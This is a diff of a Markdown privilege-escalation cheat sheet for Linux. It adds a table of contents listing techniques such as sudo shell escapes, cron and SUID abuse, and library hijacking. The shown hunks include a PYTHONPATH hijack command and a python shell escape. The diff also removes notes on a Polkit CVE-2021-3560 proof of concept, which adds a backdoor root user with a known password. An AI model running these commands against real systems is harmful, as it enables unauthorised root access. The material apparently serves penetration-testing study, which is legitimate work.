@@ -1,5 +1,71 @@
 # Linux Privilege Escalation
 
+## Table of Contents
+
+* [Basic Manual Enumeration](lin-priv-esc.md#basic-manual-enumeration)
+  * [Binaries Owned by the root user](lin-priv-esc.md#binaries-owned-by-the-root-user)
+  * [Database files](lin-priv-esc.md#database-files)
+  * [Quick SUID](lin-priv-esc.md#quick-suid)
+  * [Sudo -l](lin-priv-esc.md#sudo--l)
+    * [Taking advantage of SUID files](lin-priv-esc.md#taking-advantage-of-suid-files)
+* [Custom Binarys](lin-priv-esc.md#custom-binarys)
+  * [File Systems](lin-priv-esc.md#file-systems)
+  * [World Writeable](lin-priv-esc.md#world-writeable)
+* [Weak File Permissions](lin-priv-esc.md#weak-file-permissions)
+  * [Readable shadow](lin-priv-esc.md#readable-shadow)
+    * [Unshadow method](lin-priv-esc.md#unshadow-method)
+  * [Writeable shadow](lin-priv-esc.md#writeable-shadow)
+  * [Writable passwd](lin-priv-esc.md#writable-passwd)
+* [Passwords and Keys](lin-priv-esc.md#passwords-and-keys)
+  * [History Files](lin-priv-esc.md#history-files)
+  * [Config Files](lin-priv-esc.md#config-files)
+  * [SSH Keys](lin-priv-esc.md#ssh-keys)
+* [Old sudo version](lin-priv-esc.md#old-sudo-version)
+* [Sudo-Shell escape Sequences](lin-priv-esc.md#sudo-shell-escape-sequences)
+  * [Zip](lin-priv-esc.md#zip)
+  * [npm](lin-priv-esc.md#npm)
+  * [journalctl](lin-priv-esc.md#journalctl)
+  * [iftop](lin-priv-esc.md#iftop)
+  * [find](lin-priv-esc.md#find)
+  * [nano](lin-priv-esc.md#nano)
+  * [vim](lin-priv-esc.md#vim)
+  * [vi](lin-priv-esc.md#vi)
+  * [man](lin-priv-esc.md#man)
+  * [awk](lin-priv-esc.md#awk)
+  * [less](lin-priv-esc.md#less)
+  * [FTP](lin-priv-esc.md#ftp)
+  * [nmap](lin-priv-esc.md#nmap)
+  * [more](lin-priv-esc.md#more)
+  * [Apache2](lin-priv-esc.md#apache2)
+* [Sudo -l LD\_PRELOAD](lin-priv-esc.md#sudo--l-ld-preload)
+  * [Sudo -l LD\_PRELOAD Method 2](lin-priv-esc.md#sudo--l-ld-preload-method-2)
+* [Sudo -l Service Takeover](lin-priv-esc.md#sudo--l-service-takeover)
+* [SUID SYMLINKS CVE-2016-1247](lin-priv-esc.md#suid-symlinks-cve-2016-1247)
+* [Cron Jobs File permissions](lin-priv-esc.md#cron-jobs-file-permissions)
+  * [Cron Jobs File permissions Method 2](lin-priv-esc.md#cron-jobs-file-permissions-method-2)
+* [Cron Jobs Path Environment Variable](lin-priv-esc.md#cron-jobs-path-environment-variable)
+* [CronJobs - Wildcards](lin-priv-esc.md#cronjobs---wildcards)
+  * [CronJobs - Wildcards No msfvenom](lin-priv-esc.md#cronjobs---wildcards-no-msfvenom)
+* [SUID and SGID Executables --GTFO Bins](lin-priv-esc.md#suid-and-sgid-executables---gtfo-bins)
+* [SUID-Shared Object Injection](lin-priv-esc.md#suid-shared-object-injection)
+* [SUID and SGID Environment Variables](lin-priv-esc.md#suid-and-sgid-environment-variables)
+* [SUID and SGID Executables-Abusing Shell Features 1](lin-priv-esc.md#suid-and-sgid-executables-abusing-shell-features-1)
+  * [SUID and SGID Executables-Abusing Shell Features 2](lin-priv-esc.md#suid-and-sgid-executables-abusing-shell-features-2)
+* [NFS](lin-priv-esc.md#nfs)
+  * [NFS Method 2](lin-priv-esc.md#nfs-method-2)
+  * [NFS Errors](lin-priv-esc.md#nfs-errors)
+* [Service Exploits](lin-priv-esc.md#service-exploits)
+* [Docker Linux Local PE](lin-priv-esc.md#docker-linux-local-pe)
+* [lxd Group Priv Esc](lin-priv-esc.md#lxd-group-priv-esc)
+  * [Errors-on the vulnerable server](lin-priv-esc.md#errors-on-the-vulnerable-server)
+* [Capabilities](lin-priv-esc.md#capabilities)
+  * [Python](lin-priv-esc.md#python)
+  * [Perl](lin-priv-esc.md#perl)
+  * [Tar](lin-priv-esc.md#tar)
+* [Python Library Hijacking](lin-priv-esc.md#python-library-hijacking)
+
+[_Table of contents generated with markdown-toc_](http://ecotrust-canada.github.io/markdown-toc/)
+
 ### Basic Manual Enumeration
 
 ![alt text](https://miro.medium.com/max/2400/0\*rOZTLGBULgHhS2p\_.png)
@@ -1249,33 +1315,3 @@ python3 -c 'import os; os.system("/bin/sh")'
 ```
 sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
 ```
-
-### Manual Polkit Priv Esc Checks
-
-* POC:&#x20;
-* [https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)
-* Target needs to have `accountservice` and `gnome-control-center` installed&#x20;
-
-```
-#centos/fed/rhel
-rpm -qa accountservice
-rpm -qa gnome-control-center
-#deb/ubu
-dpkg -l | grep accountservice
-dpkg -l | grep gnome-control-center
-```
-
-* Must have `polkit` version 0.113 or later OR `0-105-26` (Debian fork of `polkit`
-* Works with `Ubuntu 20.04` and `Centos 8`, `RHEL 8`, `Fedora 21`, `Debian Bullseye`
-
-```
-cat /etc/os-release
-```
-
-* Usually need to run the POC multiple times
-* For exploitation dispite checks saying not vulnerable: `./polkit.sh -f=y`
-* If run with no options, user `secnigma` will be added to `/etc/passwd` and the password for that user is `secnigmaftw`
-* To get your root shell `su - secnigma`
-* Enter password
-* `sudo bash`
-* Profit
